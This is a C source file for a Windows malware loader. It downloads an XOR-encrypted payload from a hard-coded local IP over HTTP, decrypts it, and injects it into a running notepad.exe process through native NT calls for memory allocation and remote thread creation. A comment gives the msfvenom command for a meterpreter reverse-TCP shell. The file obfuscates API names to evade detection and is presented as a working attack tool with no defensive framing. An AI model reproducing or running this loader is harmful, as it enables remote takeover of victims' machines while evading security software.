#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include "native.h"
#include <tlhelp32.h>
#pragma comment(lib,"Winhttp")

NTSTATUS STATUS;

/* msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.13 LPORT=123 -f csharp exitfunc=thread*/

char *GetOriginal(int offsets[],char * ALL_ALPHANUM, int sizeof_offset){
    int size = sizeof_offset / 4;  // Calculate how many characters to retrieve
    char *empty_string = malloc((size + 1) * sizeof(char));  // Allocate memory for the string + null terminator

    if (empty_string == NULL) {
        //printf("Memory allocation failed\n");
        return NULL;
    }

    for (int i = 0; i < size; ++i) {
        char character = ALL_ALPHANUM[offsets[i]];
        empty_string[i] = character;  // Append the character to the string
		//printf("%c,",character);
	}

    empty_string[size] = '\0';  // Null-terminate the string

	return empty_string; 
}

void obfuscate(ALL_ALPHANUM,original)
	char * ALL_ALPHANUM;
	char * original;
{
	for (int i=0; i<strlen(original); i++){
		for (int j=0; j<strlen(ALL_ALPHANUM); j++){
			if (original[i] == ALL_ALPHANUM[j]){
				//printf("%d,",j);
			}
		}
	}
	return;
}

//enum processes
CLIENT_ID e_p( 
						FARPROC create_snap_func,
						FARPROC proc_first_func,
						FARPROC proc_next_func
						)
{
	CLIENT_ID CID;
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);
	HANDLE hProcess;
	
	//Take snapshot
	HANDLE snapshot = create_snap_func(TH32CS_SNAPPROCESS, 0);
	
	// Enumerate the snapshot
    proc_first_func(snapshot, &pe32);	
    
	// Loop through the whole snapshot until 'target.exe' is found
    do {
        if (_stricmp(pe32.szExeFile, "notepad.exe") == 0) {
			CID.UniqueProcess = (HANDLE) pe32.th32ProcessID;
			CID.UniqueThread = NULL;
			
			break;
        }  
    } while (proc_next_func(snapshot, &pe32));
	return CID;
}




void decrypt(unsigned char *magic, SIZE_T magic_size, char key) {
    //printf("[+] DECRYPTING with '%c' key\n", key);
    for (int i = 0; i < magic_size; i++) {
        //printf("\\x%02x", magic[i] ^ key);
        magic[i] = magic[i] ^ key;
    }
    printf("\n");
	return;
}


HMODULE Get_Module(LPCWSTR Module_Name)
{
	HMODULE hModule;
	//printf("[+] Getting Handle to %lu\n", Module_Name);
	hModule = GetModuleHandleW(Module_Name);
	if (hModule == NULL) {
		//printf("[x] Failed to get handle to module, error: %lu\n", GetLastError());
		exit(1);
	}
	//printf("[+] Got Handle to module!\n");
	//printf("[%ls\t0x%p ]\n", Module_Name, hModule);
	return hModule;
}

HANDLE m_stuff(NtOpenMutant NT_OpenMutant, NtCreateMutant NT_CreateMutant,HANDLE hMux,ObjectAttributes *Object_Attr_mutant){
	STATUS = NT_OpenMutant(&hMux,MUTANT_ALL_ACCESS,Object_Attr_mutant);
	
	//STATUS_OBJECT_NAME_NOT_FOUND
	if(STATUS == 0xc0000034){
		printf("[NT_OpenMutant] Mutant Object DOESN'T EXIST , status code 0x%lx\n",STATUS);
	}
	
	else if (STATUS == STATUS_SUCCESS){
		printf("[NT_OpenMutant] Got Mutant Handle -> [0x%p]\n",hMux);
		printf("[NT_OpenMutant] Mutant Object EXISTS\n");
		printf("[x] EXITING\n");
		exit(0);
	}
	
	printf("[NT_CreateMutant] Attempting to create mutant object\n");
	STATUS = NT_CreateMutant(&hMux,MUTANT_ALL_ACCESS,Object_Attr_mutant,TRUE);
	if(STATUS != STATUS_SUCCESS){
		printf("[NT_CreateMutant] Failed to create mutant object , error 0x%lx\n",STATUS);
		
		return EXIT_FAILURE;
	}
	printf("[NT_CreateMutant] Created Mutant, Handle -> [0x%p]\n",hMux);
	system("pause");
	
	return hMux;
}



unsigned char magic[511];
int main(){
	// --- START OFFSETS --- //
	int create_snap_offset[] = {28,17,4,0,19,4,45,14,14,11,7,4,11,15,55,54,44,13,0,15,18,7,14,19};
	int proc_first_offset[] = {41,17,14,2,4,18,18,55,54,31,8,17,18,19};
	int proc_next_offset[] = {41,17,14,2,4,18,18,55,54,39,4,23,19};
	int dll_k_er_32_offset[] = {10,4,17,13,4,11,55,54,62,3,11,11};
	int dll_n__t_offset[] = {39,45,29,37,37};
	int lib_load_offset[] = {37,14,0,3,37,8,1,17,0,17,24,26};
	//int mux_create_offset[] = {28,17,4,0,19,4,38,20,19,4,23,26};
	// --- END OFFSETS --- /
	
	// --- init variables --- //
	
	//int PID=atoi(argv[1]);
	HANDLE hThread;
	HANDLE hProcess;
	HANDLE hMux;
	DWORD OldProtect_MEM = 0;
	DWORD OldProtect_THREAD = 0;
	SIZE_T BytesWritten = 0;
	SIZE_T magic_size = sizeof(magic);
	BOOL bValue;
	//HMODULE hNTDLL = Get_Module(L"NTDLL");
	
	HMODULE hK32 = Get_Module(L"Kernel32");
	PVOID Buffer = NULL;	//for shellcode allocation
	char ALL_ALPHANUM[]="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._";
		
	char key1= 'P';
	char key2= 'L';
	char key3= 'S';
	char key4= 'a';
	char key5= '5';
	

	
	// --- end variables init --- //
	

	// --- START INIT STRUCTS --- //
	ObjectAttributes Object_Attr = { sizeof(Object_Attr),NULL };
	
	CLIENT_ID CID ;
	
	ObjectAttributes Object_Attr_mutant = {sizeof(Object_Attr),NULL};
	UNICODE_STRING MutantName;
	RtlInitUnicodeString(&MutantName, L"\\BaseNamedObjects\\MyMutant");
	Object_Attr_mutant.ObjectName = &MutantName;
	// --- END INIT STRUCTS --- //

	// --- START GET LoadLibraryA function ---//
	FARPROC L_0_D_LIB = GetProcAddress(hK32,GetOriginal(lib_load_offset,ALL_ALPHANUM,sizeof(lib_load_offset)));
	// --- END GET LoadLibraryA function ---//


	// --- START LOAD KERNEL32 DLL --- //
	HMODULE hDLL_k_er_32 = L_0_D_LIB(GetOriginal(dll_k_er_32_offset,ALL_ALPHANUM,sizeof(dll_k_er_32_offset)));
	if (hDLL_k_er_32 == NULL){
		//printf("[x] COULD NOT LOAD kernel32.dll, err -> %lu\n",GetLastError());
		exit(1);
	}
	// --- END LOAD KERNEL32 DLL ---//
	
	// --- START LOAD NTDLL DLL --- //
	HMODULE hDLL_n__t = L_0_D_LIB(GetOriginal(dll_n__t_offset,ALL_ALPHANUM,sizeof(dll_n__t_offset)));
	if (hDLL_k_er_32 == NULL){
		//printf("[x] COULD NOT LOAD ntdll.dll, err -> %lu\n",GetLastError());
		exit(1);
	}
	// --- END LOAD NTDLL DLL ---//
	
	// --- START FUNCTION PROTOTYPES INIT --- //
	//printf("[+] getting prototypes ready...\n");
	NtOpenProcess NT_OpenProcess = (NtOpenProcess)GetProcAddress(hDLL_n__t, "NtOpenProcess"); 
	NtCreateProcessEx NT_CreateProcessEx = (NtCreateProcessEx)GetProcAddress(hDLL_n__t,"NtCreateProcessEx");
	NtCreateThreadEx NT_CreateThreadEx = (NtCreateThreadEx)GetProcAddress(hDLL_n__t, "NtCreateThreadEx"); 
	NtClose NT_Close = (NtClose)GetProcAddress(hDLL_n__t, "NtClose");
	NtAllocateVirtualMemory NT_VirtualAlloc = (NtAllocateVirtualMemory)GetProcAddress(hDLL_n__t,"NtAllocateVirtualMemory");	
	NtWriteVirtualMemory NT_WriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(hDLL_n__t,"NtWriteVirtualMemory");		
	NtProtectVirtualMemory NT_ProtectVirtualMemory = (NtProtectVirtualMemory)GetProcAddress(hDLL_n__t,"NtProtectVirtualMemory");	
	NtWaitForSingleObject NT_WaitForSingleObject = (NtWaitForSingleObject)GetProcAddress(hDLL_n__t,"NtWaitForSingleObject");
	NtFreeVirtualMemory NT_FreeVirtualMemory = (NtFreeVirtualMemory)GetProcAddress(hDLL_n__t,"NtFreeVirtualMemory");
	NtOpenMutant NT_OpenMutant = (NtOpenMutant)GetProcAddress(hDLL_n__t,"NtOpenMutant");
	NtCreateMutant NT_CreateMutant = (NtCreateMutant)GetProcAddress(hDLL_n__t,"NtCreateMutant");
	FARPROC create_snap_func = GetProcAddress(hDLL_k_er_32,GetOriginal(create_snap_offset,ALL_ALPHANUM,sizeof(create_snap_offset)));
	FARPROC proc_first_func = GetProcAddress(hDLL_k_er_32,GetOriginal(proc_first_offset,ALL_ALPHANUM,sizeof(proc_first_offset)));
	FARPROC proc_next_func = GetProcAddress(hDLL_k_er_32,GetOriginal(proc_next_offset,ALL_ALPHANUM,sizeof(proc_next_offset)));
	//FARPROC mux_create_func =  GetProcAddress(hDLL_k_er_32,GetOriginal(mux_create_offset,ALL_ALPHANUM,sizeof(mux_create_offset))); //mutex
	//printf("[+] prototypes are ready...\n");
	// --- END FUNCTION PROTOTYPES INIT --- //
	
	
	hMux=m_stuff(NT_OpenMutant,NT_CreateMutant,hMux,&Object_Attr_mutant);

	
	
	HINTERNET hSession = WinHttpOpen(NULL,WINHTTP_ACCESS_TYPE_NO_PROXY,WINHTTP_NO_PROXY_NAME,WINHTTP_NO_PROXY_BYPASS,0);
	if (!hSession ){
		//printf("[x] WinHttpOpen FAILED %lu\n",GetLastError());
		return 1;
	}
	///printf("[+] WinHttpOpen DONE\n");
	
	HINTERNET hConnect = WinHttpConnect(hSession,L"192.168.8.145",8000,0);
	if ( !hConnect ){
		//printf("[x] WinHttpConnect FAILED, %lu\n",GetLastError());
		return 1;
		
	}
	//printf("[+] WinHttpConnect DONE\n");
	
	HINTERNET hRequest = WinHttpOpenRequest(hConnect,L"GET",L"/enc_code.bin",NULL,WINHTTP_NO_REFERER,WINHTTP_DEFAULT_ACCEPT_TYPES,0);
	if ( !hRequest ){
		//printf("[x] WinHttpOpenRequest FAILED %lu\n",GetLastError());
		return 1;
	}
	//printf("[+] WinHttpOpenRequest DONE\n");
	
	do{
		
		bValue = WinHttpSendRequest(hRequest,WINHTTP_NO_ADDITIONAL_HEADERS,0,WINHTTP_NO_REQUEST_DATA,0,0,0);
		
	} while (bValue == FALSE);
	//printf("[+] WinHttpSendRequest DONE\n");

	
	
	if ( WinHttpReceiveResponse(hRequest,NULL) == FALSE ){
		//printf("[x] WinHttpReceiveResponse FAILED %lu\n",GetLastError());
		return 1;
	}
	//printf("[+] WinHttpReceiveResponse DONE\n");

	DWORD dwSize = 0;
    if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
        //printf("[x] WinHttpQueryDataAvailable FAILED %lu\n", GetLastError());
        return 1;
    }
	//printf("[+] WinHttpQueryDataAvailable DONE\n");
	
	
    if (!magic) {
        //printf("[x] Malloc FAILED\n");
        return 1;
    }
	//printf("[+] Malloc DONE\n");
	ZeroMemory(magic, dwSize + 1);
	
	DWORD dwDownloaded = 0;
	//printf("[+] BEFORE WinHttpReadData\n");
    if (!WinHttpReadData(hRequest, (LPVOID)magic, dwSize, &dwDownloaded)) {
        //printf("[x] WinHttpReadData FAILED %lu\n", GetLastError());
        return 1;
    }
	//printf("[+] WinHttpReadData DONE\n");
	
	//printf("[+] File content: \n%s\n", magic);
	for (int i = 0; i < sizeof(magic); i++) {
	//printf("\\x%02x ", magic[i]);
	}
	//printf("\n");
	//printf("[+] File size: %d\n", sizeof(magic));

	
	//free(buffer);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
	
	
	
	
	
	
	
	


	
	CID = e_p(create_snap_func,proc_first_func,proc_next_func);
	// --- START GET PROCESS --- //
	//printf("[NtOpenProcess] GETTING Process..\n");
	STATUS = NT_OpenProcess(&hProcess,PROCESS_ALL_ACCESS,&Object_Attr,&CID);
	if (STATUS != STATUS_SUCCESS) {
		//printf("[NtOpenProcess] Failed to get handle to process, error 0x%lx\n", STATUS);
		return EXIT_FAILURE;
	}
	//printf("[NtOpenProcess] Got Handle to process! (%p)\n",hProcess);
	// --- END GET PROCESS --- //

	// --- start decryption --- //

	
	decrypt(magic,magic_size,key5);

	decrypt(magic,magic_size,key4);

	decrypt(magic,magic_size,key3);

	decrypt(magic,magic_size,key2);

	decrypt(magic,magic_size,key1);
	

	// --- end decryption --- //

	// --- START MEMORY OPERATIONS --- //
	
	//printf("[NtAllocateVirtualMemory] Allocating [RW-] memory..\n");
	STATUS=NT_VirtualAlloc(hProcess,&Buffer,0,&magic_size, MEM_COMMIT | MEM_RESERVE ,PAGE_READWRITE);	
	if(STATUS != STATUS_SUCCESS){
		//printf("[NtAllocateVirtualMemory] Failed to allocate memeory , error 0x%lx\n",STATUS);
		goto CLEANUP;
	}
	//printf("[NtAllocateVirtualMemory] Memory Allocated!\n");
	
	//printf("[NtWriteVirtualMemory] Writing shellcode into allocated memory..\n");
	STATUS=NT_WriteVirtualMemory(hProcess,Buffer,magic,magic_size,&BytesWritten);
	if(STATUS != STATUS_SUCCESS){
		//printf("[NtWriteVirtualMemory] Failed to write into memeory , error 0x%lx\n",STATUS);
		//printf("[NtWriteVirtualMemory] BytesWritten -> %lu\t ShellcodeSize -> %lu\n",BytesWritten,shellcode_size);
		goto CLEANUP;
	}
	//printf("[NtWriteVirtualMemory] Shellcode Written!, shellcode size -> %lu bytes\tactually written -> %lu bytes\n",shellcode_size,BytesWritten);

	//printf("[NtProtectVirtualMemory] Adding [--X] to memory..\n");
	STATUS=NT_ProtectVirtualMemory(hProcess,&Buffer,&magic_size,PAGE_EXECUTE_READ,&OldProtect_MEM);
	if(STATUS != STATUS_SUCCESS){
		//printf("[NtProtectVirtualMemory] Failed to add exec to page , error 0x%lx\n",STATUS);
		goto CLEANUP;
	}
	//printf("[NtProtectVirtualMemory] [--X] added!\n");
	
	// --- END MEMORY OPERATIONS --- //
	
	
	// --- START CREATE THREAD --- //

	//printf("[NtCreateThreadEx] CREATING THREAD IN Remote Process\n");
	
	STATUS=NT_CreateThreadEx(&hThread,THREAD_ALL_ACCESS,&Object_Attr,hProcess,Buffer,NULL,FALSE,0,0,0,NULL);
	if(STATUS != STATUS_SUCCESS){
		//printf("[NtCreateThreadEx] Failed to create thread , error 0x%lx\n",STATUS);
		goto CLEANUP;
	}
	//printf("[NtCreateThreadEx] Thread Created (0x%p)..\n",hThread);	
	
	// --- END CREATE THREAD --- //
	
	// --- START WAIT --- //
	//printf("[0x%p] Waiting to Finish Execution\n",hThread);
	STATUS=NT_WaitForSingleObject(hThread,FALSE,NULL);
	//printf("[NtWaitForSingleObject] Thread (0x%p) Finished! Beginning Cleanup\n",hThread);
	// --- END WAIT --- //
	
CLEANUP:
	if (Buffer){
		STATUS=NT_FreeVirtualMemory(hProcess,&Buffer,&magic_size,MEM_DECOMMIT);
		if (STATUS_SUCCESS != STATUS) {
            //printf("[NtClose] Failed to decommit allocated buffer, error 0x%lx\n", STATUS);
        }
		//printf("[NtClose] decommitted allocated buffer (0x%p) from process memory\n", Buffer);
	}
	if(hThread){
		//printf("[NtClose] Closing hThread handle\n");
		NT_Close(hThread);
	}
	if(hProcess){
		//printf("[NtClose] Closing hProcess handle\n");
		NT_Close(hProcess);
	}
	if(hMux){
		//printf("[NtClose] Closing hMux handle\n");
		NT_Close(hMux);
	}
	
	return EXIT_SUCCESS;
}
